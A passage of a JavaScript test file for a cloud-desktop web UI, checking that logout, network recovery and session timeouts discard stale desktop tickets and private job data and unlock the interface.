  assert.ok(e.btn('Sign in with passkey')); assert.equal(e.btn('Open desktop'),undefined);
  assert.ok(!e.links().some(a=>(a.getAttribute('href')||'').includes('ticket=late')));
});

await test('logout clears a pending nested-job list so its late answer cannot leak or leave the list locked', async () => {
  let reply;
  const {route}=owned(state({status:'running',machine:MACHINE,ready:true}),{'nested/jobs':()=>new Promise(r=>{reply=r;}),'auth/logout':()=>json(200,{authenticated:false})});
  const e=env({route}); await e.flush(); e.btn('Show nested jobs').click(); await e.flush();
  e.btn('Sign out').click(); await e.flush();
  reply(await json(200,{jobs:[{id:'private-old-job',provider:'nosana',status:'running'}]})); await e.flush();
  e.btn('Check connection again').click(); await e.flush();
  assert.doesNotMatch(e.text(),/private-old-job/);
  assert.equal(e.btn('Show nested jobs').disabled,false);
});

await test('a desktop ticket from before an offline interval is discarded even after network recovery', async () => {
  let reply;
  const {route}=owned(state({status:'running',machine:MACHINE,ready:true}),{launch:()=>new Promise(r=>{reply=r;})});
  const e=env({route}); await e.flush(); e.btn('Open desktop').click(); await e.flush();
  e.network(false); e.network(true); await e.flush();
  reply(await json(200,{url:`${GW}/p/_cloudbite/computer/desktop?ticket=obsolete`})); await e.flush();
  assert.ok(!e.links().some(a=>(a.getAttribute('href')||'').includes('ticket=obsolete')));
  assert.equal(e.btn('Open desktop').disabled,false);
});

await test('read-only session timeout releases UI for a manual retry', async () => {
  let n=0;
  const e=env({route:r=>++n===1 ? new Promise((_,reject)=>r.init.signal.addEventListener('abort',()=>reject(new Error('abort')))) : json(200,{authenticated:false,hasCredentials:true})});
  await e.flush(); await e.advance(30_000); assert.match(e.text(),/Network error/);
  assert.equal(e.btn('Check connection again').disabled,false);
  e.btn('Check connection again').click(); await e.flush(); assert.ok(e.btn('Sign in with passkey'));
});

console.log(`cloudbite-computer-ui: ${pass} passed`);
